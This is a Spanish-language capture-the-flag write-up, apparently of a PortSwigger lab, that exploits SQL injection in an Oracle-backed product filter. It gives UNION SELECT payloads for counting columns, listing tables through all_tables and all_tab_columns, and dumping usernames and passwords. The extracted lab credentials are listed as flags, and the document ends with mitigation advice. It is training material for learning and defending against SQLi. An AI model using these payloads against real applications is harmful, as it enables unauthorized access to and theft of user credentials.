---
title: "Ataque de inyección SQL, listando el contenido de la base de datos en Oracle"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "ataque-de-inyeccion-sql-listando-el-contenido-de-la-base-de-datos-en-oracle"
author: "Z4k7"
date: "2026-03-11"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "Database"
  - "OracleDB"
tools:
  - "Burpsuite"
flags_list:
  - label: "administrador"
    value: "administrator"
  - label: "password"
    value: "z2cv5eag7qnnwg7tb7jz"
  - label: "usuario"
    value: "carlos"
  - label: "password"
    value: "pwol05l6ubzeg8aj1b3j"
  - label: "usuario"
    value: "wiener"
  - label: "password"
    value: "v4e8nkmtuu3ejtkjytfu"
summary: "Este laboratorio explota una vulnerabilidad de inyección SQL (SQLi) en una aplicación que utiliza Oracle Database. La falla ocurre porque la entrada del usuario se concatena  directamente en la consulta SQL sin sanitización. En Oracle, cada SELECT requiere un FROM, lo  que obliga al atacante a usar la tabla especial dual para construir ataques UNION SELECT. Esto  permite enumerar tablas, columnas y finalmente extraer credenciales de usuarios"
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio presenta una vulnerabilidad de inyección SQL en el filtro de categorías de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, lo que permite usar un ataque UNION para recuperar datos de otras tablas.
          La aplicación cuenta con una función de inicio de sesión y la base de datos contiene una tabla con nombres de usuario y contraseñas. Debe determinar el nombre de esta tabla y las columnas que contiene, y luego recuperar su contenido para obtener los nombres de usuario y las contraseñas de todos los usuarios.
          Para resolver el laboratorio, inicie sesión como `administrator`usuario.
      - kind: "callout"
        type: "danger"
        label: "Pista"
        text: "En las bases de datos Oracle, cada `SELECT`La declaración debe especificar una tabla para seleccionar `FROM`. Si tu `UNION SELECT`El ataque no consulta desde una tabla, aún necesitarás incluir el `FROM`palabra clave seguida de un nombre de tabla válido. Hay una tabla incorporada en Oracle llamada `dual`que puedes usar para este propósito. Por ejemplo: `UNION SELECT 'abc' FROM dual`"

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El error de sintaxis demuestra que la entrada del usuario se inserta directamente en la consulta SQL."
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2-- -- Éxito 
          '+ORDER+BY+1,2,3-- -- Erro
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validación con `UNION SELECT` en Oracle usando `dual`:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL FROM dual-- -- Error 
          UNION SELECT NULL,NULL FROM dual-- -- Éxito 
          UNION SELECT NULL,NULL,NULL FROM dual-- -- Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144035966.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta requiere 2 columnas para que el `UNION` sea válido."
      - kind: "note"
        text: |
          Prueba de compatibilidad con datos de cadena:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT 'a',NULL FROM dual-- -- Éxito 
          UNION SELECT NULL,'a' FROM dual-- -- Éxito 
          UNION SELECT 'a','a' FROM dual-- -- Éxito
      - kind: "note"
        text: |
          Ya contamos con la validación y confirmación de las columnas intentamos obtener el nombre de las tablas  validamos primero con  `all_tables`  se envía la consulta
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT table_name,NULL FROM all_tables--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144216204.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El laboratorio nos esta solicitando el usuario administration en este caso si filtramos nos registra 1 resultado la tabla que mas llama la atención es esta `USERS_JUUAKM`"
      - kind: "note"
        text: |
          Extracción de columnas de la tabla:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_JUUAKM'--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144343087.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Columnas encontradas:
      - kind: "bullet"
        text: "EMAIL"
      - kind: "bullet"
        text: "PASSWORD_RPWWXL"
      - kind: "bullet"
        text: "USERNAME_CWVGCG"
      - kind: "note"
        text: |
          Extracción de credenciales:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT USERNAME_CWVGCG,PASSWORD_RPWWXL FROM USERS_JUUAKM--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144507553.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Credenciales obtenidas:

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "administrador"
        value: "administrator"
      - label: "password"
        value: "z2cv5eag7qnnwg7tb7jz"
      - label: "usuario"
        value: "carlos"
      - label: "password"
        value: "pwol05l6ubzeg8aj1b3j"
      - label: "usuario"
        value: "wiener"
      - label: "password"
        value: "v4e8nkmtuu3ejtkjytfu"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyección%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144632794.jpg"
        caption: "Evidencia técnica"

  - id: "step4_1"
    num: "04"
    title: "Informacion"
    content:
      - kind: "note"
        text: |
          Cuando se realiza un ataque `UNION` de inyección SQL, hay dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.
          `ORDER BY` y `UNION SELECT`
          Para aplicar el primer método de  la inyección aplicando la palabra clave `ORDER BY` de eta manera se podría calcular las columnas disponibles  Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la `WHERE`cláusula de la consulta original, enviarías:
      - kind: "code"
        lang: "SQL"
        code: |
          ' ORDER BY 1-- 
          ' ORDER BY 2-- 
          ' ORDER BY 3-- 
          etc.
      - kind: "note"
        text: |
          Par validar que real mente se a capturado o calculado la cantidad de columnas disponibles en la BD ,la base de datos devuelve un error, como el siguiente
          Validación con UNION SELECT
          Se prueban combinaciones con `NULL` para ajustar el número de columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL--   -- Error
          UNION SELECT NULL,NULL--   -- Error
          UNION SELECT NULL,NULL,NULL--   -- Éxito
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La consulta con tres valores `NULL` se ejecuta correctamente, confirmando que la tabla devuelve 3 columnas."
      - kind: "note"
        text: |
          El segundo método implica presentar una serie de `UNION SELECT`cargas útiles que especifican un número diferente de valores nulos:
      - kind: "code"
        lang: "SQL"
        code: |
          UNION SELECT NULL-- 
           UNION SELECT NULL,NULL-- 
           UNION SELECT NULL,NULL,NULL--
      - kind: "note"
        text: |
          En este caso el lo contrario no es validar el error sino salir del erro cada vez que agregas un null se espera escapara del siguiente error.
      - kind: "callout"
        type: "danger"
        label: "SQL ERROR"
        text: "All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."

  - id: "step5"
    num: "05"
    title: "Listado del contenido de la base de datos"
    content:
      - kind: "note"
        text: |
          En Oracle, puede encontrar la misma información de la siguiente manera:
          Puedes listar tablas mediante consultas `all_tables`:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT * FROM all_tables
      - kind: "note"
        text: |
          Puede enumerar columnas mediante consultas `all_tab_columns`:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
      - kind: "callout"
        type: "info"
        label: "TIP"
        text: "En exámenes y auditorías, mencionar explícitamente el uso de `dual` y las vistas de metadatos (`all_tables`, `all_tab_columns`) es clave para demostrar comprensión profunda del vector de ataque en entornos Oracle."

lessons:
  - 'Recordar que en Oracle siempre se requiere un `FROM`, siendo `dual` la tabla más usada en pruebas.'
  - 'La enumeración de tablas y columnas se realiza con `all_tables` y `all_tab_columns`.'
  - 'En auditorías reales, documentar cada paso con capturas y evidencias fortalece el reporte.'
mitigation:
  - 'Implementar consultas parametrizadas en Oracle (bind variables).'
  - 'Restringir acceso a vistas de metadatos (`all_tables`, `all_tab_columns`).'
  - 'Configurar principio de mínimo privilegio en la base de datos.'
  - 'Aplicar WAF con reglas específicas para detectar `UNION SELECT`.'
  - 'Validar y sanitizar entradas de usuario antes de construir consultas.'
---
